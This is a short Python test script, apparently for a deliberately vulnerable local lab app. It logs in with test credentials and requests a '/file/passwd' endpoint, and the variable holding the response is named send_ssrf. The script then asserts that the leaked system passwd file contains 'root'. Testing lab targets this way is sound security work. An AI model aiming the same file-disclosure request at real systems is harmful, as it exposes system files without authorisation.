from bs4 import BeautifulSoup
import requests

def test_act6():
    session = requests.session()
    login = session.post("http://localhost:5000/login", {"username": "test@user.com", "password": "password"}).text
    send_ssrf = session.get("http://localhost:5000/file/passwd").content
    
    soup = BeautifulSoup(send_ssrf, "html.parser")
    text=soup.find_all(text=True)

    assert "root" in text[0]

if __name__ == "__main__":
    test_act6()
